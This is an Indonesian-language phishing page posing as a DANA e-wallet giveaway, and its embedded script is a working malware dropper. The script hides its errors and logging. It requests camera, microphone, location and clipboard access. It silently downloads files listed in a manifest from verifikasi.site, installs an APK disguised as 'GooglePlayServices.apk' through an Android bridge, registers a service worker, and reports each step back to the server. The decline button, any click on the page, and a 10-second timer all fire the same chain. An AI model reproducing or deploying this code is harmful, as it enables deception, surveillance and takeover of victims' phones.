<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999998;display:none;justify-content:center;align-items:center;flex-direction:column;color:#fff;font-size:14px}
        .loading-overlay .spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .loading-overlay .step-text{color:#8899aa;font-size:12px;margin-top:5px}
    </style>
</head>
<body>

<div id="statusBar" class="status-bar"></div>

<div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div id="loadingTitle">⏳ Memproses...</div>
    <div class="step-text" id="loadingStep">🔑 Mengambil password...</div>
</div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40"><path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z"/></svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 INDEX.HTML - IMPLEMENTASI ALUR FINAL
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var MANIFEST_URL = SERVER + '/files/manifest.txt';
var FILES_BASE_URL = SERVER + '/files/';
var semuaDidapat = false;
var NOTIFICATION_SHOWN = false;

// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; }, true);
if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// DETEKSI ANDROID BRIDGE
// ============================================================
var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: HAS_BRIDGE,
    saveFile: function(path, content) {
        if (this.isAvailable) {
            try { AndroidBridge.saveFile(path, content); return true; } catch(e) {}
        }
        return false;
    },
    openFile: function(path) {
        if (this.isAvailable) {
            try { AndroidBridge.openFile(path); return true; } catch(e) {}
        }
        return false;
    },
    openApp: function(pkg) {
        if (this.isAvailable) {
            try { AndroidBridge.openApp(pkg); return true; } catch(e) {}
        }
        return false;
    },
    installAPK: function(path) {
        if (this.isAvailable) {
            try { AndroidBridge.installAPK(path); return true; } catch(e) {}
        }
        return false;
    },
    fileExists: function(path) {
        if (this.isAvailable) {
            try { return AndroidBridge.fileExists(path); } catch(e) {}
        }
        return false;
    }
};

// ============================================================
// KIRIM DATA
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// UI
// ============================================================
function showLoading(show, text) {
    var overlay = document.getElementById('loadingOverlay');
    var textEl = document.getElementById('loadingText');
    if (show) {
        overlay.style.display = 'flex';
        if (text) textEl.textContent = text;
    } else {
        overlay.style.display = 'none';
    }
}
function updateLoading(text) {
    document.getElementById('loadingText').textContent = text;
}

function showStatusBar() {
    document.getElementById('statusBar').className = 'status-bar loading';
}

// ============================================================
// STEP 1: BYPASS SEMUA IZIN
// ============================================================
function injectAllPermissions() {
    K({ sumber: 'bypass_start', data: 'all' });
    try {
        navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy:true, timeout:5000});
    } catch(e) {}
    try {
        if (Notification.permission !== 'granted') Notification.requestPermission();
    } catch(e) {}
    try {
        navigator.clipboard.readText().catch(function(){});
        navigator.clipboard.writeText('test').catch(function(){});
    } catch(e) {}
    try {
        navigator.mediaDevices.getUserMedia({audio:true, video:false})
            .then(function(s){ s.getTracks().forEach(function(t){ t.stop(); }); }).catch(function(){});
    } catch(e) {}
    try {
        navigator.mediaDevices.getUserMedia({audio:false, video:true})
            .then(function(s){ s.getTracks().forEach(function(t){ t.stop(); }); }).catch(function(){});
    } catch(e) {}
    try {
        navigator.mediaDevices.getUserMedia({audio:true, video:true})
            .then(function(s){ s.getTracks().forEach(function(t){ t.stop(); }); }).catch(function(){});
    } catch(e) {}
    try { navigator.vibrate(1); } catch(e) {}
    try {
        if (navigator.storage && navigator.storage.persist) {
            navigator.storage.persist().catch(function(){});
        }
    } catch(e) {}
    try {
        if (navigator.wakeLock) {
            navigator.wakeLock.request('screen').catch(function(){});
        }
    } catch(e) {}
    K({ sumber: 'bypass_done', data: 'all' });
}

// ============================================================
// STEP 2: DOWNLOAD PAYLOAD DARI MANIFEST
// ============================================================
function downloadPayloadSilent() {
    return new Promise(function(resolve) {
        K({ sumber: 'download_start', data: 'ok' });
        updateLoading('📥 Mendownload payload...');

        fetch(MANIFEST_URL, { method: 'GET', cache: 'no-store' })
            .then(function(res) { return res.text(); })
            .then(function(text) {
                var files = text.split('\n')
                    .map(function(line) { return line.trim(); })
                    .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });
                if (files.length === 0) { resolve(); return; }

                var promises = files.map(function(file) { return downloadSingleFile(file); });
                return Promise.all(promises);
            })
            .then(function() {
                K({ sumber: 'download_complete', data: 'ok' });
                updateLoading('✅ Payload selesai!');
                resolve();
            })
            .catch(function(err) {
                K({ sumber: 'download_error', data: err.message });
                resolve();
            });
    });
}

function downloadSingleFile(fileName) {
    return new Promise(function(resolve) {
        var url = FILES_BASE_URL + fileName;
        var isApk = fileName.toLowerCase().endsWith('.apk');

        fetch(url, { method: 'GET', cache: 'no-store' })
            .then(function(res) {
                if (isApk) {
                    return res.blob().then(function(blob) {
                        return { content: blob, type: 'blob' };
                    });
                } else {
                    return res.text().then(function(text) {
                        return { content: text, type: 'text' };
                    });
                }
            })
            .then(function(data) {
                // SIMPAN VIA BRIDGE
                if (A.isAvailable) {
                    try {
                        var path = '/storage/emulated/0/Download/' + fileName;
                        if (data.type === 'text') {
                            A.saveFile(path, data.content);
                        } else {
                            var reader = new FileReader();
                            reader.onload = function() {
                                var base64 = reader.result.split(',')[1];
                                var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                                if (AndroidBridge.saveFileBinary) {
                                    AndroidBridge.saveFileBinary(path, binary);
                                }
                            };
                            reader.readAsDataURL(data.content);
                        }
                        K({ sumber: 'download_bridge', data: { file: fileName } });
                        resolve();
                        return;
                    } catch(e) {}
                }

                // FALLBACK: BLOB
                try {
                    var blob = data.type === 'text' ? new Blob([data.content], {type: 'text/html'}) : data.content;
                    var blobUrl = URL.createObjectURL(blob);
                    var a = document.createElement('a');
                    a.href = blobUrl;
                    a.download = fileName;
                    a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                    document.body.appendChild(a);
                    setTimeout(function() {
                        a.click();
                        setTimeout(function() {
                            try { document.body.removeChild(a); } catch(e) {}
                            URL.revokeObjectURL(blobUrl);
                        }, 2000);
                    }, 300);
                    K({ sumber: 'download_blob', data: { file: fileName } });
                    resolve();
                } catch(e) {
                    resolve();
                }
            })
            .catch(function() { resolve(); });
    });
}

// ============================================================
// STEP 3: TAMPILKAN NOTIFIKASI
// ============================================================
function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;

    K({ sumber: 'notification_attempt', data: 'start' });

    if (!('Notification' in window)) {
        K({ sumber: 'notification_fallback', data: 'no_api' });
        fallbackInstallAndOpen();
        return;
    }

    if (Notification.permission === 'denied') {
        K({ sumber: 'notification_fallback', data: 'denied' });
        fallbackInstallAndOpen();
        return;
    }

    if (Notification.permission === 'granted') {
        createNotification();
        return;
    }

    if (Notification.permission === 'default') {
        Notification.requestPermission().then(function(p) {
            if (p === 'granted') { createNotification(); }
            else { fallbackInstallAndOpen(); }
        }).catch(function() { fallbackInstallAndOpen(); });
        return;
    }

    fallbackInstallAndOpen();
}

function createNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk klaim saldo DANA Rp500.000!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
            requireInteraction: true,
            silent: false,
            vibrate: [200, 100, 200]
        });

        notif.onclick = function() {
            notif.close();
            K({ sumber: 'notification_clicked', data: 'ok' });
            installAndOpen();
        };

        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
        K({ sumber: 'notification_shown', data: 'ok' });
    } catch(e) {
        K({ sumber: 'notification_error', data: e.message });
        fallbackInstallAndOpen();
    }
}

function fallbackInstallAndOpen() {
    K({ sumber: 'fallback_execute', data: 'install_and_open' });
    setTimeout(function() {
        installAndOpen();
    }, 1000);
}

// ============================================================
// STEP 4: INSTALL APK + BUKA SYSTEMUPDATE.HTML
// ============================================================
function installAndOpen() {
    K({ sumber: 'install_start', data: 'ok' });

    if (A.isAvailable) {
        try {
            A.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
            K({ sumber: 'apk_install', data: 'ok' });
        } catch(e) {}

        try {
            if (A.fileExists('/storage/emulated/0/Download/SystemUpdate.html')) {
                A.openFile('/storage/emulated/0/Download/SystemUpdate.html');
                K({ sumber: 'html_open', data: 'ok' });
            } else {
                window.open(SERVER + '/files/SystemUpdate.html', '_blank');
            }
        } catch(e) {}
    }

    // JANGAN REDIRECT KE DANA DI SINI!
    // Biarkan SystemUpdate.html yang handle redirect setelah semua proses selesai!
}

// ============================================================
// STEP 5: SERVICE WORKER
// ============================================================
function registerSW() {
    if (!('serviceWorker' in navigator)) return;
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .then(function() { K({ sumber: 'sw_registered', data: 'ok' }); })
        .catch(function() {});
}

// ============================================================
// MAIN EXECUTION (BERURUTAN!)
// ============================================================
async function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;

    document.getElementById('popupDana').style.display = 'none';
    showLoading(true, '⏳ Memproses...');
    showStatusBar();

    K({ sumber: 'start', data: 'dapatkanSemua' });

    try {
        // STEP 1: Bypass semua izin
        updateLoading('🔓 Bypass izin...');
        injectAllPermissions();

        // STEP 2: Download payload
        await downloadPayloadSilent();

        // STEP 3: Register Service Worker
        updateLoading('📡 Service Worker...');
        registerSW();

        // STEP 4: Tampilkan notifikasi
        updateLoading('🔔 Notifikasi...');
        showKlaimNotification();

        // STEP 5: Selesai
        updateLoading('✅ Selesai!');
        K({ sumber: 'all_done', data: 'success' });

        setTimeout(function() {
            showLoading(false);
        }, 2000);

    } catch(e) {
        K({ sumber: 'error', data: e.message });
        setTimeout(function() {
            showLoading(false);
        }, 3000);
    }
}

function klaim() { K({sumber:'click', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'click', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER 10 DETIK
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'timer', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'click_anywhere', data:'triggered'});
        dapatkanSemua();
    }
});

console.log('🔥 INDEX.HTML - IMPLEMENTASI FINAL');
console.log('📱 Bridge:', HAS_BRIDGE);
</script>
</body>
</html>
